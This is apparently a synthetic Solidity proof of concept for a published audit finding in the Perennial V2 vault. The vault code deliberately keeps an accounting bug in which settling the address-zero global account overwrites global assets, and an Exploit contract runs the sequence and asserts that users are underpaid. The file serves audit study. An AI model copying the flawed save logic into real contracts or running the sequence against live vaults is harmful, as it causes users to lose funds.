// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Perennial V2 Vault — settle(address(0)) corrupts global assets
    (Sherlock 2023-07, finding 24303, WATCHPUG).
    SYNTHETIC, cheatcode-free. The settle path below is the audited
    _settle / processGlobal / processLocal / toAssetsGlobal / toAssetsLocal
    / _saveContext body (@> VULN).

    Amounts are whole token units. The audited UFixed6 formulas reduce to
    these integer operations when every division is exact.

    Root cause: the global account lives at address(0). settle(address(0))
    loads that account as both global and local. The while-loop credits
    assets with toAssetsGlobal, which subtracts the full keeper fee. The
    following processLocal credits the same account with toAssetsLocal,
    which subtracts only keeper/count. _saveContext stores global first
    and local second, so the local result replaces the global one.
    Global assets end higher than they should. The next checkpoint
    snapshots balance minus that phantom claimable, and a later redeem
    pays less than the shares are worth. The shortfall stays in the vault. */

type UFixed6 is uint256;
type Fixed6 is int256;

library UFixed6Lib {
    function add(UFixed6 a, UFixed6 b) internal pure returns (UFixed6) {
        return UFixed6.wrap(UFixed6.unwrap(a) + UFixed6.unwrap(b));
    }

    function sub(UFixed6 a, UFixed6 b) internal pure returns (UFixed6) {
        return UFixed6.wrap(UFixed6.unwrap(a) - UFixed6.unwrap(b));
    }

    function muldiv(UFixed6 a, UFixed6 b, UFixed6 c) internal pure returns (UFixed6) {
        return UFixed6.wrap(UFixed6.unwrap(a) * UFixed6.unwrap(b) / UFixed6.unwrap(c));
    }

    function div(UFixed6 a, UFixed6 b) internal pure returns (UFixed6) {
        return UFixed6.wrap(UFixed6.unwrap(a) / UFixed6.unwrap(b));
    }

    function isZero(UFixed6 a) internal pure returns (bool) {
        return UFixed6.unwrap(a) == 0;
    }

    function min(UFixed6 a, UFixed6 b) internal pure returns (UFixed6) {
        return UFixed6.unwrap(a) < UFixed6.unwrap(b) ? a : b;
    }

    function from(uint256 v) internal pure returns (UFixed6) {
        return UFixed6.wrap(v);
    }

    function from(Fixed6 v) internal pure returns (UFixed6) {
        require(Fixed6.unwrap(v) >= 0, "neg");
        return UFixed6.wrap(uint256(Fixed6.unwrap(v)));
    }
}

using UFixed6Lib for UFixed6 global;

library Fixed6Lib {
    Fixed6 internal constant ZERO = Fixed6.wrap(0);

    function add(Fixed6 a, Fixed6 b) internal pure returns (Fixed6) {
        return Fixed6.wrap(Fixed6.unwrap(a) + Fixed6.unwrap(b));
    }

    function lte(Fixed6 a, Fixed6 b) internal pure returns (bool) {
        return Fixed6.unwrap(a) <= Fixed6.unwrap(b);
    }

    function max(Fixed6 a, Fixed6 b) internal pure returns (Fixed6) {
        return Fixed6.unwrap(a) >= Fixed6.unwrap(b) ? a : b;
    }

    function from(UFixed6 v) internal pure returns (Fixed6) {
        return Fixed6.wrap(int256(UFixed6.unwrap(v)));
    }
}

using Fixed6Lib for Fixed6 global;

struct Account {
    uint256 current;
    uint256 latest;
    UFixed6 shares;
    UFixed6 assets;
    UFixed6 deposit;
    UFixed6 redemption;
}

struct Checkpoint {
    UFixed6 deposit;
    UFixed6 redemption;
    UFixed6 shares;
    Fixed6 assets;
    UFixed6 fee;
    UFixed6 keeper;
    uint256 count;
}

struct Context {
    Account global;
    Account local;
    Checkpoint latestCheckpoint;
    uint256 currentId;
    Checkpoint currentCheckpoint;
}

library CheckpointLib {
    function initialize(Checkpoint memory self, Account memory global, uint256 balance) internal pure {
        self.shares = global.shares;
        self.assets = Fixed6Lib.from(UFixed6.wrap(balance).sub(global.deposit).sub(global.assets));
    }

    function update(Checkpoint memory self, UFixed6 deposit, UFixed6 redemption) internal pure {
        (self.deposit, self.redemption) = (self.deposit.add(deposit), self.redemption.add(redemption));
        self.count++;
    }

    function complete(Checkpoint memory self, Fixed6 assets, UFixed6 fee, UFixed6 keeper) internal pure {
        self.assets = self.assets.add(assets);
        self.fee = fee;
        self.keeper = keeper;
    }

    /// Audited toAssetsGlobal. Subtracts the full checkpoint keeper fee.
    function toAssetsGlobal(Checkpoint memory self, UFixed6 shares) internal pure returns (UFixed6) {
        // vault is fresh, use par value
        return _withoutKeeperGlobal(self, self.shares.isZero() ? shares : _toAssets(self, shares));
    }

    /// Audited toAssetsLocal. Subtracts keeper/count instead of the full keeper.
    function toAssetsLocal(Checkpoint memory self, UFixed6 shares) internal pure returns (UFixed6) {
        // vault is fresh, use par value
        // @> VULN: keeper/count, not the full keeper. settle(address(0)) runs this on the global redemption.
        return _withoutKeeperLocal(self, self.shares.isZero() ? shares : _toAssets(self, shares));
    }

    function toSharesGlobal(Checkpoint memory self, UFixed6 assets) internal pure returns (UFixed6) {
        if (self.shares.isZero()) return assets;
        return self.assets.lte(Fixed6Lib.ZERO) ? assets : _toShares(self, _withoutKeeperGlobal(self, assets));
    }

    function toSharesLocal(Checkpoint memory self, UFixed6 assets) internal pure returns (UFixed6) {
        if (self.shares.isZero()) return assets;
        return self.assets.lte(Fixed6Lib.ZERO) ? assets : _toShares(self, _withoutKeeperLocal(self, assets));
    }

    function _toShares(Checkpoint memory self, UFixed6 assets) private pure returns (UFixed6) {
        UFixed6 selfAssets = UFixed6Lib.from(self.assets.max(Fixed6Lib.ZERO));
        return _withSpread(self, assets.muldiv(self.shares, selfAssets));
    }

    function _toAssets(Checkpoint memory self, UFixed6 shares) private pure returns (UFixed6) {
        UFixed6 selfAssets = UFixed6Lib.from(self.assets.max(Fixed6Lib.ZERO));
        return _withSpread(self, shares.muldiv(selfAssets, self.shares));
    }

    function _withSpread(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {
        UFixed6 selfAssets = UFixed6Lib.from(self.assets.max(Fixed6Lib.ZERO));
        UFixed6 totalAmount = self.deposit.add(self.redemption.muldiv(selfAssets, self.shares));
        return totalAmount.isZero() ? amount : amount.muldiv(totalAmount.sub(self.fee.min(totalAmount)), totalAmount);
    }

    function _withoutKeeperGlobal(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {
        return _withoutKeeper(amount, self.keeper);
    }

    function _withoutKeeperLocal(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {
        UFixed6 keeperPer = self.count == 0 ? UFixed6.wrap(0) : self.keeper.div(UFixed6Lib.from(self.count));
        return _withoutKeeper(amount, keeperPer);
    }

    function _withoutKeeper(UFixed6 amount, UFixed6 keeper) private pure returns (UFixed6) {
        return amount.sub(keeper.min(amount));
    }
}

using CheckpointLib for Checkpoint global;

library AccountLib {
    function processGlobal(
        Account memory self,
        uint256 latestId,
        Checkpoint memory checkpoint,
        UFixed6 deposit,
        UFixed6 redemption
    ) internal pure {
        self.latest = latestId;
        (self.assets, self.shares) = (
            self.assets.add(checkpoint.toAssetsGlobal(redemption)),
            self.shares.add(checkpoint.toSharesGlobal(deposit))
        );
        (self.deposit, self.redemption) = (self.deposit.sub(deposit), self.redemption.sub(redemption));
    }

    function processLocal(
        Account memory self,
        uint256 latestId,
        Checkpoint memory checkpoint,
        UFixed6 deposit,
        UFixed6 redemption
    ) internal pure {
        self.latest = latestId;
        (self.assets, self.shares) = (
            self.assets.add(checkpoint.toAssetsLocal(redemption)),
            self.shares.add(checkpoint.toSharesLocal(deposit))
        );
        (self.deposit, self.redemption) = (self.deposit.sub(deposit), self.redemption.sub(redemption));
    }

    function update(
        Account memory self,
        uint256 currentId,
        UFixed6 assets,
        UFixed6 shares,
        UFixed6 deposit,
        UFixed6 redemption
    ) internal pure {
        self.current = currentId;
        (self.assets, self.shares) = (self.assets.sub(assets), self.shares.sub(shares));
        (self.deposit, self.redemption) = (self.deposit.add(deposit), self.redemption.add(redemption));
    }
}

using AccountLib for Account global;

contract Asset {
    string public constant name = "Perennial USD";
    string public constant symbol = "USD";
    uint8 public constant decimals = 0;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function pull(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        balanceOf[msg.sender] += amount;
    }

    function push(address to, uint256 amount) external {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
    }
}

contract Vault {
    Asset public asset;
    // Stand-in for Mapping.ready: the underlying market has settled this id.
    mapping(uint256 => bool) private _ready;
    mapping(uint256 => UFixed6) private _keeperOf;
    mapping(uint256 => uint256) private _mappedMarket;
    mapping(address => Account) internal _accounts;
    mapping(uint256 => Checkpoint) internal _checkpoints;
    uint256 public marketId;
    address public constant KEEPER = address(0xBEEF);

    constructor(address asset_) {
        asset = Asset(asset_);
    }

    function globalAssets() public view returns (uint256) {
        return UFixed6.unwrap(_accounts[address(0)].assets);
    }

    function globalShares() public view returns (uint256) {
        return UFixed6.unwrap(_accounts[address(0)].shares);
    }

    function assetsOf(address account) public view returns (uint256) {
        return UFixed6.unwrap(_accounts[account].assets);
    }

    function sharesOf(address account) public view returns (uint256) {
        return UFixed6.unwrap(_accounts[account].shares);
    }

    /// Opening position at 1:1. Not part of the audited settle path.
    function seed(address account, uint256 amount) external {
        asset.pull(account, amount);
        Account memory global = _accounts[address(0)];
        global.shares = global.shares.add(UFixed6.wrap(amount));
        _accounts[address(0)] = global;
        Account memory local = _accounts[account];
        local.shares = local.shares.add(UFixed6.wrap(amount));
        _accounts[account] = local;
    }

    /// Underlying oracle/market clock advanced. The next order opens a checkpoint.
    function advance() external {
        marketId++;
    }

    /// Markets are settled. `keeperAmount` is the checkpoint settlement fee, paid out now.
    function markSettled(uint256 keeperAmount) external {
        uint256 id = _accounts[address(0)].current;
        _ready[id] = true;
        _keeperOf[id] = UFixed6.wrap(keeperAmount);
        if (keeperAmount != 0) asset.push(KEEPER, keeperAmount);
    }

    function redeem(address account, uint256 shares) external {
        _touch(account, UFixed6.wrap(0), UFixed6.wrap(shares), UFixed6.wrap(0));
    }

    function claim(address account, uint256 amount) external {
        _touch(account, UFixed6.wrap(0), UFixed6.wrap(0), UFixed6.wrap(amount));
    }

    /// Audited entry. Anyone may pass address(0), which is the global account.
    function settle(address account) public {
        Context memory context = _loadContext(account);
        _settle(context);
        _saveContext(context, account);
    }

    function _touch(address account, UFixed6 depositAssets, UFixed6 redeemShares, UFixed6 claimAssets) private {
        Context memory context = _loadContext(account);
        _settle(context);
        _checkpoint(context);
        context.global.update(context.currentId, claimAssets, redeemShares, depositAssets, redeemShares);
        context.local.update(context.currentId, claimAssets, redeemShares, depositAssets, redeemShares);
        context.currentCheckpoint.update(depositAssets, redeemShares);
        if (!depositAssets.isZero()) asset.pull(account, UFixed6.unwrap(depositAssets));
        if (!claimAssets.isZero()) asset.push(account, UFixed6.unwrap(claimAssets));
        // Update-path save. settle() uses the audited _saveContext below.
        _accounts[address(0)] = context.global;
        _accounts[account] = context.local;
        _checkpoints[context.currentId] = context.currentCheckpoint;
    }

    function _checkpoint(Context memory context) private {
        if (marketId > _mappedMarket[context.global.current]) {
            context.currentId = context.global.current + 1;
            context.currentCheckpoint.initialize(context.global, asset.balanceOf(address(this)));
            _mappedMarket[context.currentId] = marketId;
        } else {
            context.currentId = context.global.current;
            context.currentCheckpoint = _checkpoints[context.currentId];
        }
    }

    /// Audited _settle. Global loop, then one local settlement.
    function _settle(Context memory context) private {
        // settle global positions
        while (
            context.global.current > context.global.latest && _ready[context.global.latest + 1]
        ) {
            uint256 newLatestId = context.global.latest + 1;
            context.latestCheckpoint = _checkpoints[newLatestId];
            (Fixed6 collateralAtId, UFixed6 feeAtId, UFixed6 keeperAtId) = _collateralAtId(newLatestId);
            context.latestCheckpoint.complete(collateralAtId, feeAtId, keeperAtId);
            context.global.processGlobal(
                newLatestId,
                context.latestCheckpoint,
                context.latestCheckpoint.deposit,
                context.latestCheckpoint.redemption
            );
            _checkpoints[newLatestId] = context.latestCheckpoint;
        }

        // settle local position
        if (context.local.current > context.local.latest && _ready[context.local.current]) {
            uint256 newLatestId = context.local.current;
            Checkpoint memory checkpoint = _checkpoints[newLatestId];
            context.local.processLocal(
                newLatestId, checkpoint, context.local.deposit, context.local.redemption
            );
        }
    }

    function _loadContext(address account) private view returns (Context memory context) {
        context.global = _accounts[address(0)];
        context.local = _accounts[account];
        context.latestCheckpoint = _checkpoints[context.global.latest];
    }

    /// Audited save order: global, then local. internal so the control can override it.
    function _saveContext(Context memory context, address account) internal virtual {
        _accounts[address(0)] = context.global;
        // FIX (perennial-v2#86): store local only when account != address(0), and store global last.
        _accounts[account] = context.local;
        _checkpoints[context.currentId] = context.currentCheckpoint;
    }

    function _collateralAtId(uint256 id) private view returns (Fixed6 value, UFixed6 fee, UFixed6 keeper) {
        // Collateral sits in the vault balance and was snapshotted at initialize. Keeper is the settlement fee.
        value = Fixed6Lib.ZERO;
        fee = UFixed6.wrap(0);
        keeper = _keeperOf[id];
    }
}

contract Exploit {
    address public constant ALICE = address(0xA11CE);
    address public constant BOB = address(0xB0B);

    Asset public asset; // nonce 1
    Vault public vault; // nonce 2
    uint256 public assetsAfterZeroSettle;
    uint256 public lockedAssets;

    constructor() {
        asset = new Asset();
        vault = new Vault(address(asset));
    }

    function run() external {
        asset.mint(ALICE, 1000);
        asset.mint(BOB, 1000);
        vault.seed(ALICE, 1000);
        vault.seed(BOB, 1000);

        // One checkpoint, two redemptions, so count is 2 and keeper/count is half the fee.
        vault.advance();
        vault.redeem(ALICE, 400);
        vault.redeem(BOB, 400);
        vault.markSettled(40);
        vault.settle(address(0));
        assetsAfterZeroSettle = vault.globalAssets();

        vault.settle(ALICE);
        vault.settle(BOB);
        uint256 aliceDue = vault.assetsOf(ALICE);
        uint256 bobDue = vault.assetsOf(BOB);
        require(aliceDue == 380 && bobDue == 380, "local claims");
        vault.claim(ALICE, aliceDue);
        vault.claim(BOB, bobDue);

        // Phantom global assets shrink the next checkpoint. The remaining shares redeem short.
        vault.advance();
        vault.redeem(ALICE, 600);
        vault.redeem(BOB, 600);
        vault.markSettled(0);
        vault.settle(ALICE);
        vault.settle(BOB);
        aliceDue = vault.assetsOf(ALICE);
        bobDue = vault.assetsOf(BOB);
        require(aliceDue == 590 && bobDue == 590, "exit claims");
        vault.claim(ALICE, aliceDue);
        vault.claim(BOB, bobDue);

        lockedAssets = asset.balanceOf(address(vault));
        require(assetsAfterZeroSettle == 780, "global assets not inflated");
        require(asset.balanceOf(ALICE) == 970, "alice underpaid");
        require(asset.balanceOf(BOB) == 970, "bob underpaid");
        require(lockedAssets == 20, "assets not locked");
        require(vault.globalAssets() == 20, "phantom claimable");
        require(vault.assetsOf(ALICE) == 0 && vault.assetsOf(BOB) == 0, "users could claim phantom");
    }
}
